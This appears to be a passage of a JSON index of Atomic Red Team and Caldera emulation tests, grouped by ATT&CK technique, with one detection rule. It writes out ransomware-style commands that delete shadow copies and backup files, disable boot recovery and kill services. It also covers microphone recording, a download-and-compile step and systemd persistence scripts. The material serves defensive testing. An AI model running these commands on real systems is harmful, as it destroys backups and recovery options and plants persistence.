"command_prompt", "elevation_required": true, "command": "net.exe stop #{service_name}\n", "cleanup_command": "net.exe start #{service_name} >nul 2>&1\n"}}, {"name": "Windows - Stop service by killing process", "description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "supported_platforms": ["windows"], "input_arguments": {"process_name": {"description": "Name of a process to kill", "type": "String", "default": "spoolsv.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "taskkill.exe /f /im #{process_name}\n"}}]}}], "command_list": ["sc.exe stop spooler\n", "net.exe stop spooler\n", "taskkill.exe /f /im spoolsv.exe\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1490", "commands": [{"source": "atomics/T1490/T1490.yaml", "command": "vssadmin.exe delete shadows /all /quiet\n", "name": null}, {"source": "atomics/T1490/T1490.yaml", "command": "wmic.exe shadowcopy delete\n", "name": null}, {"source": "atomics/T1490/T1490.yaml", "command": "wbadmin.exe delete catalog -quiet\n", "name": null}, {"source": "atomics/T1490/T1490.yaml", "command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "name": null}, {"source": "atomics/T1490/T1490.yaml", "command": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n", "name": null}, {"source": "atomics/T1490/T1490.yaml", "command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Inhibit System Recovery": {"attack_technique": "T1490", "display_name": "Inhibit System Recovery", "atomic_tests": [{"name": "Windows - Delete Volume Shadow Copies", "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Create volume shadow copy of C:\\ . This prereq command only works on Windows Server or Windows 8.\n", "prereq_command": "if(!(vssadmin.exe list shadows | findstr \"No items found that satisfy the query.\")) { exit 0 } else { exit 1 }\n", "get_prereq_command": "vssadmin.exe create shadow /for=c:\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "vssadmin.exe delete shadows /all /quiet\n"}}, {"name": "Windows - Delete Volume Shadow Copies via WMI", "description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nShadow copies can only be created on Windows server or Windows 8.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "wmic.exe shadowcopy delete\n"}}, {"name": "Windows - Delete Windows Backup Catalog", "description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "wbadmin.exe delete catalog -quiet\n"}}, {"name": "Windows - Disable Windows Recovery Console Repair", "description": "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "cleanup_command": "bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures\nbcdedit.exe /set {default} recoveryenabled yes\n"}}, {"name": "Windows - Delete Volume Shadow Copies via WMI with PowerShell", "description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n"}}, {"name": "Windows - Delete Backup Files", "description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n"}}]}}], "command_list": ["vssadmin.exe delete shadows /all /quiet\n", "wmic.exe shadowcopy delete\n", "wbadmin.exe delete catalog -quiet\n", "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n", "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1496", "commands": [{"source": "atomics/T1496/T1496.yaml", "command": "yes > /dev/null\n", "name": null}, {"source": "data/abilities/impact/78524da1-f347-4fbb-9295-209f1f408330.yml", "command": {"darwin": {"sh": {"command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n", "timeout": 120}}}, "name": "Install sox and record microphone for n-seconds"}], "parsed_datasets": [{"Atomic Red Team Test - Resource Hijacking": {"attack_technique": "T1496", "display_name": "Resource Hijacking", "atomic_tests": [{"name": "macOS/Linux - Simulate CPU Load with Yes", "description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "bash", "command": "yes > /dev/null\n"}}]}}, {"Mitre Stockpile - Install sox and record microphone for n-seconds": {"id": "78524da1-f347-4fbb-9295-209f1f408330", "name": "Record microphone", "description": "Install sox and record microphone for n-seconds", "tactic": "impact", "technique": {"attack_id": "T1496", "name": "Resource Hijacking"}, "platforms": {"darwin": {"sh": {"command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n", "timeout": 120}}}}}], "command_list": ["yes > /dev/null\n", {"darwin": {"sh": {"command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n", "timeout": 120}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1500", "commands": [{"source": "atomics/T1500/T1500.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} PathToAtomicsFolder\\T1500\\src\\calc.cs\n", "name": null}, {"source": "atomics/T1500/T1500.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1500.exe #{input_file}\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Compile After Delivery": {"attack_technique": "T1500", "display_name": "Compile After Delivery", "atomic_tests": [{"name": "Compile After Delivery using csc.exe", "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1500.exe will be placed in the temp folder\n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "C# code that launches calc.exe from a hidden cmd.exe Window", "type": "Path", "default": "PathToAtomicsFolder\\T1500\\src\\calc.cs"}, "output_file": {"description": "Output compiled binary", "type": "Path", "default": "C:\\Windows\\Temp\\T1500.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "C# file must exist on disk at specified location (#{input_file})\n", "prereq_command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{input_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1500/src/calc.cs\" -OutFile \"#{input_file}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} #{input_file}\n", "cleanup_command": "del #{output_file} >nul 2>&1\n"}}]}}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} PathToAtomicsFolder\\T1500\\src\\calc.cs\n", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1500.exe #{input_file}\n"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Suspicious Csc.exe Source File Folder", "id": "dcaa3f04-70c3-427a-80b4-b870d73c94c4", "description": "Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)", "status": "experimental", "references": ["https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/", "https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf", "https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/"], "author": "Florian Roth", "date": "2019/08/24", "modified": "2019/08/31", "tags": ["attack.defense_evasion", "attack.t1500"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\csc.exe", "CommandLine": ["*\\AppData\\\\*", "*\\Windows\\Temp\\\\*"]}, "condition": "selection"}, "falsepositives": ["Unkown"], "level": "high"}}]}, {"technique_id": "T1501", "commands": [{"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > /etc/systemd/system/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Service]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Install]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"WantedBy=default.target\" >> /etc/systemd/system/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "name": null}, {"source": "atomics/T1501/T1501.yaml", "command": "echo \"[Unit]\" > #{systemd_service_path}/art-systemd-service.service\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/art-systemd-service.service\necho \"\" >> #{systemd_service_path}/art-systemd-service.service\necho \"[Service]\" >> #{systemd_service_path}/art-systemd-service.service\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"\" >> #{systemd_service_path}/art-systemd-service.service\necho \"[Install]\" >> #{systemd_service_path}/art-systemd-service.service\necho \"WantedBy=default.target\" >> #{systemd_service_path}/art-systemd-service.service\nsystemctl daemon-reload\nsystemctl enable art-systemd-service.service\nsystemctl start art-systemd-service.service\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Systemd Service": {"attack_technique": "T1501", "display_name": "Systemd Service", "atomic_tests": [{"name": "Create Systemd Service", "description": "This test creates a Systemd service unit file and enables it as a service.\n", "supported_platforms": ["linux"], "input_arguments": {"execstart_action": {"description": "ExecStart action for Systemd service", "type": "String", "default": "/bin/touch /tmp/art-systemd-execstart-marker"}, "execstartpre_action": {"description": "ExecStartPre action for Systemd service", "type": "String", "default": "/bin/touch /tmp/art-systemd-execstartpre-marker"}, "execstartpost_action": {"description": "ExecStartPost action for Systemd service", "type": "String", "default": "/bin/touch /tmp/art-systemd-execstartpost-marker"}, "execreload_action": {"description": "ExecReload action for Systemd service", "type": "String", "default": "/bin/touch /tmp/art-systemd-execreload-marker"}, "execstop_action": {"description": "ExecStop action for Systemd service", "type": "String", "default": "/bin/touch /tmp/art-systemd-execstop-marker"}, "execstoppost_action": {"description": "ExecStopPost action for Systemd service", "type": "String", "default": "/bin/touch /tmp/art-systemd-execstoppost-marker"}, "systemd_service_path": {"description": "Path to systemd service unit file", "type": "Path", "default": "/etc/systemd/system"}, "systemd_service_file": {"description": "File name of systemd service unit file", "type": "String", "default": "art-systemd-service.service"}}, "executor": {"name": "bash", "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "cleanup_command": "systemctl stop #{systemd_service_file}\nsystemctl disable #{systemd_service_file}\nrm -rf #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\n"}}]}}], "command_list": ["echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable 